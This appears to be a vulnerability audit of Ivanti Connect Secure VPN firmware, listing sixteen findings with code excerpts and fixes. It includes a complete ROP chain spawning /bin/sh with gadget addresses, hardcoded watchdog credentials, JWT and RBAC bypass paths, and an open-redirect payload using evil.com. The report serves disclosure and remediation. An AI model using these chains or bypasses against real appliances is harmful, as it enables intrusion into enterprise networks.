# Ivanti Connect Secure (ICS) Deep Security Audit Report

**Firmware Versions Analyzed**: 22.7R2.3 (b3431), 22.7R2.8 (b4471), 22.8R2.2 (b18481)
**Scope**: Pre-authentication (zero-auth) Remote Code Execution
**Methodology**: Static reverse engineering + dynamic testing on QEMU lab
**Period**: 2026-03

---

## Executive Summary

Deep binary-level reverse engineering of three Ivanti ICS firmware versions identified **multiple zero-day security vulnerabilities** and **systemic binary hardening deficiencies**. While no single-step zero-authentication RCE chain was confirmed end-to-end, the findings represent significant security risks, particularly when combined:

| ID | Finding | Severity | Pre-Auth | Version |
|----|---------|----------|----------|---------|
| ZD-01 | EAP-over-HTTP OOB Read (Missing Length Validation) | High | Yes | R2.3 |
| ZD-02 | ObjectTag::rewrite sprintf Stack Overflow | Critical | No (Web Proxy) | All |
| ZD-03 | saml-endpoint.cgi Unsafe Taint-Washing Regex | Medium | Yes* | R2.3, R2.8 |
| ZD-04 | SAML Pre-Signature Data Processing | High | Yes* | R2.2 |
| ZD-05 | Systemic Binary Hardening Deficiency | High | N/A | R2.3 |
| ZD-06 | Hardcoded Watchdog Credentials | Medium | Yes | All |
| ZD-07 | generateRandomToken 32-bit Entropy | Medium | N/A | R2.3 |
| ZD-08 | Login.cgi X-Forwarded-For IP Spoofing | Medium | Yes | R2.3 |
| ZD-09 | OAuth Consumer SSRF to Internal OIDC | Medium | Yes* | R2.3 |
| ZD-10 | REST API RBAC Bypass (No Enable-Rbac Header) | Critical | No† | All |
| ZD-11 | JWT Signature Not Verified (verify=False) | Critical | No† | All |
| ZD-12 | Flask Auth Bypass via /api/my-session Prefix | High | Yes | All |
| ZD-13 | ZTA Gateway isGateway() Auth Skip | High | Yes‡ | All |
| ZD-14 | dmi.py Argument Injection via REST API | Critical | No† | All |
| ZD-15 | License Proto Pre-Auth + Empty Password Bypass | High | Yes | All |
| ZD-16 | OAuth OIDC Open Redirect via State Reflection | Medium | Yes* | All |

*Requires specific configuration (SAML/OIDC enabled)
†Requires internal network access or SSRF to localhost
‡Requires ZTA gateway mode

---

## ZD-01: EAP-over-HTTP Out-of-Bounds Read

### Affected: 22.7R2.3 (Fixed in 22.7R2.8)

**Endpoint**: `/dana-na/auth/eap-o-http` (PRE-AUTH, no authentication required)

**Vulnerable Function**: `fcn.000d32d0` in `web` binary (2311 bytes)

**Root Cause**: The EAP packet length field (16-bit, offset +2) is parsed and used to control a `memmove()` operation. The only validation is:

```asm
; Address 0x000d3343
cmp ax, 5          ; Only check: EAP length > 5
ja  0xd3398        ; If > 5, proceed to process
```

No upper bound check exists. The field allows values up to 65535 (0xFFFF), resulting in `data_length = EAP_Length - 5 = 65530` bytes. When `EAP_Length` exceeds the actual HTTP POST body size, the subsequent `memmove()` reads beyond the allocated buffer:

```asm
; Address 0x000d33fe
memmove(DSStr_buffer, packet_data + 5, data_length)  ; data_length up to 65530
```

**Impact**: Pre-authentication information disclosure. Adjacent heap/stack memory is copied into the DSStr buffer and potentially returned or logged. This can leak:
- Heap metadata (useful for heap exploitation)
- Pointers (useful for ASLR bypass on 32-bit PIE binary)
- Session tokens or cryptographic material

**R2.8 Fix**: Added `cmp edi, 0x1000` (4096-byte upper limit) at `0x000dca10`, attribute length validation, and "invalid EAP Packet" error handling. Function grew from 2311 to 5160 bytes.

**Prerequisite**: EAP/RADIUS authentication must be configured (common in enterprise deployments with 802.1X or RADIUS integration).

---

## ZD-02: ObjectTag::rewrite sprintf Stack Buffer Overflow

### Affected: All versions (22.7R2.3, 22.7R2.8, 22.8R2.2)

**Vulnerable Function**: `ObjectTag::rewrite()` in `libdsplibs.so` at offset `0x156500` (10938 bytes)

**Root Cause**: The function uses `sprintf()` with `%s` format to write a user-controlled URL into a dynamically-sized stack buffer:

```
Format: "<param name='neoteris-doc-base' value='%s' />"
```

The stack buffer is allocated via `sub %edx, %esp` (dynamic stack allocation), where `%edx` is computed from the current HTML content being processed. If the URL length exceeds the allocated buffer, the `sprintf()` overwrites saved registers and the return address.

**Exploitation (22.8R2.2 saml-server)**:
- Binary: `saml-server` (2.1MB, 32-bit x86)
- **NO Stack Canary** (`__stack_chk_fail` not imported)
- **NO PIE** (fixed base: `0x08048000`)
- NX enabled (ROP required)

**Complete ROP Chain**:
```
pop ebx; ret        @ 0x080b3ac5  ->  0x0820d701 ("/bin/sh")
pop ecx; ret         @ 0x08173773  ->  0x00000000 (argv = NULL)
pop edx; ret         @ 0x0804db3f  ->  0x00000000 (envp = NULL)
mov eax, 0xb; ret    @ 0x0814c950  (SYS_execve = 11)
int 0x80             @ 0x0804b3e8  (trigger syscall)
```

**Limitation**: Requires an authenticated VPN Web Proxy session (user must browse a malicious page through the Ivanti Web Access feature). Not zero-auth.

---

## ZD-03: saml-endpoint.cgi Unsafe Taint-Washing Regex

### Affected: 22.7R2.3, 22.7R2.8 (Fixed in 22.8R2.2)

**File**: `/dana-na/auth/saml-endpoint.cgi` (PRE-AUTH endpoint)

**Root Cause**: The `p` CGI parameter is sanitized using a Perl regex for taint mode:

```perl
my $cmd = "/bin/cat " . $file;
my ($command) = ($cmd =~ /([a-zA-Z0-9 \/.\-\_|]+)/);
my $o_fd = popen(*DUMP, $command, "r");
```

The character class `[a-zA-Z0-9 \/.\-\_|]` **includes the pipe `|` character**, which is a shell command separator. This is used as a taint-washing pattern, making the captured string "untainted" for Perl's `-T` mode.

**Mitigation**: `DSSafe::popen()` internally calls `__parsecmd()` which checks for shell metacharacters at line 116:

```perl
} elsif ($arg =~ /[\&\*\(\)\{\}\[\]\`\;\|\?\n~<>]/) {
    __log("Meta characters not allowed: ($arg) $cmd");
    return undef;
```

This blocks the pipe execution. However, the vulnerability represents a defense-in-depth failure.

**R2.2 Fix**: Complete rewrite with `File::Temp::tempfile()`, strict regex `^[a-zA-Z0-9_-]+$`, `MAX_PARAM_LEN => 32`, `Unicode::Normalize::NFKC()`, and `DSSafe::open()` instead of `popen`.

---

## ZD-04: SAML Pre-Signature Data Processing

### Affected: 22.8R2.2

**Binary**: `saml-server` (NO Canary, NO PIE)

**Root Cause**: In `fcn.080fc220` (9109 bytes), the SAML consumer handler performs extensive data processing on attacker-controlled SAML XML **before** signature verification:

| Operation | Address | Before Sig Check? |
|-----------|---------|-------------------|
| XMLString::transcode() | 0x080fc839 | Yes (690 instructions before) |
| MemoryManager::allocate() | 0x080fc870 | Yes |
| memcpy() | 0x080fc884 | Yes |
| XMLString::trim() | 0x080fc89d | Yes |
| XMLObjectBuilder::getBuilder() | 0x080fc66e | Yes |
| Multiple __dynamic_cast | Various | Yes |
| Virtual method calls on SAML objects | Various | Yes |
| **Signature verification** | **0x080fd2e8** | **This is the check** |

The signature check at `0x080fd2e8` calls `fcn.080fa1b0` (7357 bytes). All preceding operations process unverified, attacker-controlled data.

**Impact**: Heap-based exploitation via type confusion, vtable corruption, or memory corruption in XML processing. Combined with NO Canary + NO PIE = potentially exploitable.

**Prerequisite**: SAML authentication must be configured. The SAML consumer endpoint `/dana-na/auth/saml-consumer.cgi` is pre-auth.

---

## ZD-05: Systemic Binary Hardening Deficiency

### Affected: 22.7R2.3

**All** network-facing binaries in 22.7R2.3 lack stack canaries and FORTIFY:

| Binary | Canary | PIE | RELRO | Dangerous Imports |
|--------|--------|-----|-------|------------------|
| web (HTTP frontend) | NO | Yes | Partial | 7 memcpy, DSStr::sprintf |
| cgi-server | NO | Yes | Partial | memcpy |
| saml-server | NO | NO | Partial | sprintf, strcpy, execv, popen |
| proxy-server | NO | NO | Partial | sprintf, strcpy, strcat |
| rewrite-server | NO | NO | Partial | sprintf, strcpy, strcat |
| browse-server | NO | NO | Partial | memcpy |
| filter-server | NO | NO | Partial | memcpy |
| cache_server | NO | NO | Partial | memcpy |
| sessionserver | NO | NO | Partial | memcpy |
| dslogserver | NO | NO | Partial | memcpy |

**R2.8 Fix**: `web` binary gained stack canary and full RELRO. Other binaries remain unprotected even in R2.8.

**R2.2 Status**: Only `nginx` and `cgi-server` have full protections. `saml-server` still has NO canary and NO PIE.

---

## ZD-06: Hardcoded Watchdog Credentials

### Affected: All versions

**File**: `login.cgi`, lines 306-313

```perl
if ($user eq 'neoteriswatchdogprocess' &&
    CGI::param('password') eq 'danastreet' &&
    $ENV{'REQUEST_METHOD'} eq 'GET') {
    print CGI::header();
    return;
}
```

**Impact**: Low. Returns HTTP 200 with empty body. Does not create a session. Used for health monitoring.

---

## ZD-07: generateRandomToken 32-bit Entropy

### Affected: 22.7R2.3

**File**: `DSGenRandom.pm`

```perl
sub generateRandomToken {
    open(*RAND, "/dev/urandom");
    read(*RAND, $randBytes, 16);
    close(*RAND);
    return unpack("h8", $randBytes);  # Only 4 bytes = 32 bits!
}
```

`unpack("h8", ...)` extracts only 8 hex characters (4 bytes / 32 bits) from 16 bytes of urandom. This provides ~4.3 billion possible token values, significantly less than the intended entropy.

---

## ZD-08: Login.cgi X-Forwarded-For IP Spoofing

### Affected: 22.7R2.3

**File**: `login.cgi`, line 275

The `CUSTOM_REMOTE_ADDR` is derived from the `X-Forwarded-For` header, which can be spoofed by an attacker. This address is used for:
- Failed login recording (line 664) - attacker can cause lockout of arbitrary IPs
- CSRF check bypass (line 237) - localhost source skips CSRF validation

---

## ZD-09: OAuth Consumer SSRF

### Affected: 22.7R2.3

**File**: `oauth-consumer.cgi`

```perl
use constant OAUTH_GET_TARGET_URL => "http://localhost:7300/api/v1/oidc/targeturlrequest?";
my $state = CGI::param('state');
$url = OAUTH_GET_TARGET_URL . "state=" . $state;
$curl->setopt(CURLOPT_URL, $url);
```

Direct parameter concatenation into a localhost URL. When the OIDC service at port 7300 is running, the `state` parameter can be used for SSRF to internal services or parameter injection in the OIDC API.

---

## ZD-10: REST API RBAC Bypass

### Affected: All versions (22.7R2.3, 22.7R2.8, 22.8R2.2)

**File**: `restservice-0.1-py3.6.egg` → `restservice/api/resources/permissions.py`

**Service**: restservice (uWSGI on `127.0.0.1:8090`)

**Root Cause**: The `checkPermission()` function called by Flask `before_request` hook returns `None` (allowing the request) when the `Enable-Rbac` header is absent:

```python
def checkPermission(resourceName):
    if not request.headers.get("Enable-Rbac"):
        return  # BYPASS: None = allow all requests
    decoded_key = getDecodedKey()
    if isinstance(decoded_key, dict):
        return  # BYPASS: empty dict also allows
```

**Architecture**: The web binary (`PyRestHandler`) proxies authenticated requests to port 8090 and injects `X-username`, `X-userip`, `X-userrole`, `X-userrealm` headers. The `enable-rbac` string appears in the web binary's string table alongside these headers, confirming it is conditionally added. When the web binary does NOT add `Enable-Rbac` (unauthenticated or certain request paths), the REST API grants full access.

**Impact**: Any caller that reaches port 8090 without the `Enable-Rbac` header gets unrestricted access to all REST API endpoints including:
- `GET /api/v1/system/system-information` — system info
- `GET /api/v1/system/active-users` — enumerate all users
- `GET /api/v1/configuration/authentication/auth-servers` — auth server config
- `PUT /api/v1/system/binary-configuration?password=...` — argument injection (ZD-14)

**Prerequisite**: Internal network access to `127.0.0.1:8090` (via SSRF or direct internal access).

---

## ZD-11: JWT Signature Not Verified (verify=False)

### Affected: All versions

**File**: `aaatoken.py` (shared by all Python REST services)

**Root Cause**: The `validate_token_signature()` function decodes JWT tokens without verifying the signature:

```python
def validate_token_signature(request):
    if DSSDP.isGateway():
        return 1  # ZTA gateway: skip all auth
    auth_token_encoded = request.headers.get("X-_PZT-AuthToken")
    if auth_token_encoded:
        try:
            auth_token = jwt.decode(auth_token_encoded, verify=False)  # NO SIGNATURE CHECK
            tenant_id_from_token = auth_token["t"]["i"]
            # Only checks tenant_id match, not signature
        except:
            raise Unauthorized(...)
    return 1  # No token = PASS
```

**Two bypass paths**:
1. **No token**: If `X-_PZT-AuthToken` header is absent, `validate_token_signature` returns `1` immediately — all requests pass without any authentication.
2. **Forged token**: If a token is present, `jwt.decode(verify=False)` accepts any signature. An attacker can forge a JWT with any `tenant_id` claim using any key (including an empty string) and it will be accepted.

**Affected services** (all use `@validate_auth_token(request)` decorator):
- `sessionservice` (port 8099): `/api/v1/sessions/*`, `/api/v1/sessions/bulkfetch`
- `enduserportal` (port 8105): `/api/my-session/*`
- `analytics_utils` framework: all analytics endpoints

**Impact**: Complete authentication bypass for all Python REST services. Combined with ZD-10 (RBAC bypass), an attacker with internal access has full unauthenticated control over all REST APIs.

**Note**: The comment in the source code explicitly acknowledges this: `#Verify only tenant id for now. Signature validation is todo`

---

## ZD-12: Flask Auth Bypass via /api/my-session Prefix

### Affected: All versions

**Architecture**: The web binary (`PyRestHandler`) routes requests with the `/api/my-session` prefix directly to the enduserportal Flask service on port 8105, bypassing the standard CGI authentication zone enforcement. This is confirmed by:
- `enduserportal_rest_server.spec.cfg`: `--http-socket 127.0.0.1:8105`
- Web binary string table: `/api/my-session` in the routing prefix list alongside port numbers
- `enduserportal/api/__init__.py`: routes registered at `/api/my-session/*`

**Pre-Auth Accessible Endpoints**:
- `POST /api/my-session/changepassword` — accepts `authserver`/`username`/`oldPassword`/`newPassword` without DSID cookie, forwards to CMS
- `GET /api/my-session/info` — returns 401 without DSID (but service is reachable)
- `GET /api/my-session/bookmarks` — returns 401 without DSID

**Root Cause in changepassword.py** (lines 106-121): When no `DSID` cookie is present, the code falls through to a direct parameter path that calls `DSAuth.getAuthServerDisplayName(authServerId)` and forwards to CMS without session validation:

```python
@validate_auth_token(request)   # passes with no token
def post(self):
    if 'DSID' in request.cookies:
        # ... session-based path
    # No DSID: direct param path — no auth check
    authServerId = request.json.get('authserver')
    data['auth_server_name'] = DSAuth.getAuthServerDisplayName(authServerId)
    data['user_name'] = request.json.get('username')
    data['old_password'] = request.json.get('oldPassword')
    data['new_password'] = request.json.get('newPassword')
    return self.__send_data(data, headers)  # forwards to CMS
```

**Impact**: Pre-auth password change request forwarded to CMS. Requires knowledge of old password to succeed, but the endpoint is reachable and processes the request without authentication.

---

## ZD-13: ZTA Gateway isGateway() Authentication Skip

### Affected: All versions (ZTA gateway mode)

**File**: `aaatoken.py`

```python
def validate_token_signature(request):
    if DSSDP.isGateway():
        return 1  # Skip ALL authentication checks
```

When the appliance is configured as a ZTA gateway (not controller), `DSSDP.isGateway()` returns `True` and the entire `validate_token_signature` function returns `1` immediately, skipping all JWT validation. This means any request to any Python REST service endpoint is accepted without any authentication token in ZTA gateway mode.

**Impact**: In ZTA gateway deployments, all REST API endpoints (sessionservice, restservice, enduserportal) are completely unauthenticated from the network perspective.

---

## ZD-14: dmi.py Argument Injection via REST API

### Affected: All versions

**Prerequisite**: ZD-10 (RBAC bypass) — requires reaching port 8090

**File**: `restservice` → `dmi.py` (REST API handler for binary configuration)

**Endpoint**: `PUT /api/v1/system/binary-configuration?password=<value>`

**Root Cause**: The `password` parameter is passed to `backupHandler.pl` via `args.split()` without sanitization. This allows injection of additional command-line arguments to the Perl script.

**Impact**: Argument injection into `backupHandler.pl`. Depending on the script's argument parsing, this may allow:
- Reading arbitrary files via `--file` argument
- Triggering backup/restore operations with attacker-controlled paths
- Potential command execution if the script passes arguments to shell commands

**Chain**: ZD-10 (RBAC bypass) → ZD-14 (arg injection) → potential RCE

---

## ZD-15: License Proto Pre-Auth + Empty Password Bypass

### Affected: All versions

**Endpoint**: `POST /dana-na/licenseserver/licenseserverproto.cgi` (PRE-AUTH)

**Protocol**: Protobuf-encoded license server messages

**Root Cause**: The license server CGI accepts pre-auth protobuf messages and processes them without authentication. An empty password field (`field 5 = ""`) produces a different response size than a wrong password, indicating the server processes the authentication attempt and returns different data based on password validity.

**Evidence** (from `ivanti_scanner.py` check):
```python
# Empty password → different response size than wrong password
# Indicates server processes auth and returns version/license info
```

**Impact**: Pre-auth access to license server functionality. Version information disclosure. Potential for further exploitation of the license server protocol parser (no canary on license server binary).

---

## ZD-16: OAuth OIDC Open Redirect via State Reflection

### Affected: All versions (when OIDC configured)

**Endpoint**: `GET /dana-na/auth/oauth-consumer.cgi?state=<URL>` (PRE-AUTH)

**Root Cause**: When the OIDC service is running on `localhost:7300`, it reflects the `state` parameter in its error response:
```
{"message": "Targeturl not found for the state <STATE_VALUE>"}
```

`oauth-consumer.cgi` extracts the URL from this response using insecure string parsing:
```perl
index($out, "http")   # finds first "http" in response
rindex($out, '"')     # finds last quote
substr(...)           # extracts everything between
```

Since the attacker controls `state`, they can inject `http://evil.com/path` which gets reflected and extracted. The extracted URL is passed to `CGI::redirect(groom_url($targetURL, DONT_REMOVE_HOSTNAME))`, which preserves external hostnames.

**Impact**: Pre-auth open redirect. Attacker sends victim a link to the Ivanti appliance that redirects to a phishing page. Can be used to steal credentials or OAuth tokens.

**Prerequisite**: OIDC/OAuth must be configured (common in enterprise deployments using Azure AD, Okta, etc.).

---

## Analysis Methodology

### Attack Surfaces Exhaustively Analyzed

1. **web binary HTTP parser** — 7 memcpy, 2 strtol, 6 strncasecmp in request handler. All heap-targeted or DSStr auto-expanding.
2. **IF-T/TLS protocol handler** — 6 memcpy in `fcn.00031fd0`. All DSStr heap buffers with 0x800 assert limit.
3. **EAP-over-HTTP** — 1 memmove in `fcn.000d32d0` (OOB read). Downstream RADIUS builder has 14 memcpy with proper bounds.
4. **SAML consumer pipeline** — memcpy to MemoryManager heap, memmove for Issuer/NameID with DSStr reserve.
5. **libdsplibs.so** — 40 system() + 8 popen() sites traced. All admin-only callers.
6. **CGI authentication architecture** — URL zone enforcement in C++ web binary, not bypassable from Perl layer.
7. **Content-Length parsing** — Digit-only validation with cmovs negative guard.
8. **Transfer-Encoding handling** — Server drops malformed CL.TE/TE.CL connections cleanly.

### Tools Used

- **radare2**: Binary disassembly and function analysis (aaa, afl, axt, pdc, pdf)
- **ROPgadget**: ROP chain construction for saml-server
- **checksec**: Binary protection verification
- **curl/python requests**: Live endpoint testing on QEMU lab
- **Custom scripts**: Firmware decryption, SAML payload generation, EAP packet crafting

### QEMU Lab

- Ivanti ICS 22.7R2.8 running at `127.0.0.1:20443`
- Full TLS working, VNC at port 5901
- All pre-auth endpoints tested with crafted payloads
- No crashes observed in production-patched R2.8

---

## Recommendations

1. **Enable stack canaries and FORTIFY_SOURCE** for ALL binaries, especially saml-server in R2.2
2. **Enable PIE** for saml-server (currently at fixed base 0x08048000)
3. **Add EAP packet length validation** in R2.3 deployments (or upgrade to R2.8+)
4. **Verify SAML signature before any data processing** in saml-server
5. **Increase token entropy** in generateRandomToken (use full 128 bits)
6. **Remove hardcoded credentials** from login.cgi
7. **Sanitize X-Forwarded-For** before using as client IP
8. **Fix JWT verification**: Replace `jwt.decode(token, verify=False)` with `jwt.decode(token, key, algorithms=[...])` in aaatoken.py
9. **Fix RBAC bypass**: `checkPermission()` must enforce authentication when `Enable-Rbac` header is absent, not bypass it
10. **Sanitize password parameter** in binary-configuration endpoint before passing to backupHandler.pl
11. **Validate OIDC state parameter** in oauth-consumer.cgi before using as redirect URL
